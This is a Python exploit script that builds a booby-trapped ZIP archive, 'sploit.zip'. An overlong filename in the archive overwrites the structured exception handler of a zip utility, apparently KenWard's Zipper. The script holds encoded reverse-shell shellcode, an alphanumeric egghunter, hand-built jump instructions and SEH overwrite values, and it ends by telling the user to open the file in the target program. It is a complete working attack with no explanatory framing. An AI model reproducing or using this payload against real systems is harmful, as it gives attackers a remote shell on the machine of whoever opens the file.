#!/usr/bin/python
import struct

ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

#central directory header
cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00\x24\x00\x00"
"\x00\x00\x00\x00\x00")

# end of central directory header
eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")


revshell =  "w00tw00t"
revshell += b"\x89\xe1\xd9\xc5\xd9\x71\xf4\x5b\x53\x59\x49\x49"
revshell += b"\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
revshell += b"\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
revshell += b"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
revshell += b"\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
revshell += b"\x39\x6c\x39\x78\x6b\x32\x47\x70\x45\x50\x65\x50"
revshell += b"\x31\x70\x6b\x39\x79\x75\x55\x61\x79\x50\x35\x34"
revshell += b"\x6c\x4b\x50\x50\x70\x30\x6e\x6b\x70\x52\x36\x6c"
revshell += b"\x4c\x4b\x56\x32\x35\x44\x4c\x4b\x71\x62\x36\x48"
revshell += b"\x46\x6f\x6c\x77\x73\x7a\x34\x66\x44\x71\x6b\x4f"
revshell += b"\x4e\x4c\x65\x6c\x75\x31\x31\x6c\x63\x32\x66\x4c"
revshell += b"\x77\x50\x69\x51\x68\x4f\x66\x6d\x45\x51\x58\x47"
revshell += b"\x38\x62\x5a\x52\x46\x32\x42\x77\x4e\x6b\x63\x62"
revshell += b"\x76\x70\x4c\x4b\x61\x5a\x45\x6c\x6c\x4b\x72\x6c"
revshell += b"\x54\x51\x63\x48\x38\x63\x51\x58\x65\x51\x7a\x71"
revshell += b"\x76\x31\x6e\x6b\x72\x79\x57\x50\x35\x51\x4e\x33"
revshell += b"\x4e\x6b\x32\x69\x37\x68\x68\x63\x44\x7a\x33\x79"
revshell += b"\x6e\x6b\x36\x54\x6c\x4b\x35\x51\x6a\x76\x50\x31"
revshell += b"\x79\x6f\x4e\x4c\x6a\x61\x68\x4f\x36\x6d\x56\x61"
revshell += b"\x6f\x37\x67\x48\x39\x70\x33\x45\x78\x76\x56\x63"
revshell += b"\x61\x6d\x4b\x48\x45\x6b\x63\x4d\x51\x34\x53\x45"
revshell += b"\x78\x64\x52\x78\x6e\x6b\x61\x48\x76\x44\x57\x71"
revshell += b"\x4a\x73\x55\x36\x4e\x6b\x44\x4c\x52\x6b\x4e\x6b"
revshell += b"\x56\x38\x35\x4c\x33\x31\x78\x53\x6c\x4b\x35\x54"
revshell += b"\x4e\x6b\x36\x61\x6a\x70\x6e\x69\x43\x74\x75\x74"
revshell += b"\x44\x64\x53\x6b\x61\x4b\x33\x51\x61\x49\x52\x7a"
revshell += b"\x70\x51\x39\x6f\x4b\x50\x53\x6f\x71\x4f\x72\x7a"
revshell += b"\x6e\x6b\x44\x52\x48\x6b\x6e\x6d\x53\x6d\x53\x58"
revshell += b"\x54\x73\x30\x32\x73\x30\x37\x70\x65\x38\x74\x37"
revshell += b"\x63\x43\x36\x52\x63\x6f\x61\x44\x61\x78\x62\x6c"
revshell += b"\x42\x57\x37\x56\x36\x67\x79\x6f\x4b\x65\x38\x38"
revshell += b"\x7a\x30\x76\x61\x57\x70\x77\x70\x65\x79\x78\x44"
revshell += b"\x31\x44\x30\x50\x45\x38\x75\x79\x4d\x50\x72\x4b"
revshell += b"\x35\x50\x39\x6f\x68\x55\x72\x70\x70\x50\x62\x70"
revshell += b"\x52\x70\x43\x70\x72\x70\x61\x50\x70\x50\x63\x58"
revshell += b"\x7a\x4a\x44\x4f\x4b\x6f\x6d\x30\x6b\x4f\x79\x45"
revshell += b"\x6f\x67\x42\x4a\x44\x45\x30\x68\x59\x50\x4e\x48"
revshell += b"\x33\x54\x50\x75\x33\x58\x64\x42\x33\x30\x34\x51"
revshell += b"\x31\x4c\x6c\x49\x39\x76\x30\x6a\x46\x70\x66\x36"
revshell += b"\x50\x57\x55\x38\x6c\x59\x6c\x65\x50\x74\x70\x61"
revshell += b"\x69\x6f\x38\x55\x4f\x75\x6b\x70\x71\x64\x44\x4c"
revshell += b"\x69\x6f\x52\x6e\x73\x38\x53\x45\x38\x6c\x33\x58"
revshell += b"\x6a\x50\x6d\x65\x4f\x52\x32\x76\x4b\x4f\x69\x45"
revshell += b"\x72\x48\x43\x53\x52\x4d\x72\x44\x65\x50\x6b\x39"
revshell += b"\x4b\x53\x66\x37\x72\x77\x52\x77\x44\x71\x79\x66"
revshell += b"\x53\x5a\x75\x42\x61\x49\x61\x46\x79\x72\x49\x6d"
revshell += b"\x53\x56\x39\x57\x62\x64\x65\x74\x47\x4c\x43\x31"
revshell += b"\x37\x71\x4c\x4d\x67\x34\x71\x34\x72\x30\x39\x56"
revshell += b"\x73\x30\x72\x64\x30\x54\x52\x70\x61\x46\x53\x66"
revshell += b"\x63\x66\x63\x76\x42\x76\x42\x6e\x32\x76\x50\x56"
revshell += b"\x61\x43\x52\x76\x45\x38\x74\x39\x48\x4c\x55\x6f"
revshell += b"\x6d\x56\x69\x6f\x6e\x35\x4e\x69\x69\x70\x70\x4e"
revshell += b"\x43\x66\x63\x76\x69\x6f\x44\x70\x63\x58\x47\x78"
revshell += b"\x6d\x57\x45\x4d\x45\x30\x6b\x4f\x6e\x35\x6d\x6b"
revshell += b"\x5a\x50\x6e\x55\x6c\x62\x33\x66\x75\x38\x4f\x56"
revshell += b"\x6e\x75\x6d\x6d\x6d\x4d\x49\x6f\x4b\x65\x55\x6c"
revshell += b"\x43\x36\x53\x4c\x77\x7a\x4f\x70\x69\x6b\x69\x70"
revshell += b"\x73\x45\x56\x65\x4d\x6b\x42\x67\x66\x73\x33\x42"
revshell += b"\x50\x6f\x33\x5a\x43\x30\x33\x63\x69\x6f\x78\x55"
revshell += b"\x41\x41"








egghunter = "SYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIBFK19ZKODO720R2JC2V8HM6NWL35QJ44JOOHD76PFPT4LKKJNORUKZNOSEKWKOM7AA"

jump2jumpEBX = "\x75\x9d"

jmpEBX  = "\x54\x5B"
jmpEBX += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jmpEBX += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jmpEBX += "\x05\x12\x77\x62\x41" ## add  eax, 0x41627712
jmpEBX += "\x05\x12\x66\x52\x41" ## add  eax, 0x41526612
jmpEBX += "\x05\x12\x55\x62\x41" ## add  eax, 0x41625512
jmpEBX += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
jmpEBX += "\x50"                 ## push eax
jmpEBX += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jmpEBX += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jmpEBX += "\x05\x33\x41\x76\x41" ## add  eax, 0x41764133
jmpEBX += "\x05\x33\x40\x75\x41" ## add  eax, 0x41754033
jmpEBX += "\x50"                 ## push eax


shortJumpForward = "\x74\x2B"

jumpBack = "\x74\x9F"

nSEH = "\x74\x9F\x75\x9F"
SEH  = struct.pack("<I", 0x00433B3B)

payload  = egghunter
payload += "A" * (773 - len(egghunter))
payload += "\x61" * 83
payload += shortJumpForward
payload += "A" * 41
payload += jumpBack
payload += jmpEBX
payload += jump2jumpEBX
payload += "A" * (123 - len(jumpBack)  -len(jmpEBX) - len(jump2jumpEBX))
payload += nSEH
payload += SEH
payload += revshell
payload += "D" * (4064 - len(payload))

payload += ".bin"

zip = ( ldf_header + payload + cdf_header + payload + eofcdf_header );

f = open("sploit.zip", "w")
f.write(zip)
f.close()

print "[*] Local file header size = 0x%x" %len(ldf_header)
print "[*] Central directory file header size = 0x%x" %len(cdf_header)
print "[*] End of central directory record size = 0x%x" %len(eofcdf_header)
print "[*] Payload size = %s bytes" %len(payload)
print "[*] sploit.zip created.  Open it with KenWard's Zipper."

